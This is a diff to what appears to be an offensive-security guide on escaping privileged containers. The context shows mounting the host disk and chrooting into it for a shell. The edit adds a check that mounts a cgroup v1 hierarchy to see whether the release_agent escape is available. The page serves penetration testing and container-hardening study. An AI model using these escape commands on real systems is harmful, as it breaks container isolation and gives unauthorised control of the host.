@@ -25,8 +25,8 @@ mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh
 If mounting the disk is awkward, the cgroup `release_agent` route works from any privileged container:
 
 ```bash
-# See cgroups-release-agent for the full technique
-grep -q cgroup /proc/filesystems && echo "release_agent escape available"
+# release_agent needs a MOUNTABLE cgroup v1 hierarchy (absent on cgroup v2-only hosts)
+mount -t cgroup -o rdma cgroup /tmp/cg 2>/dev/null && echo "v1 release_agent available" || echo "no v1 hierarchy; mount the host disk instead"
 ```
 
 ## Exploitation notes
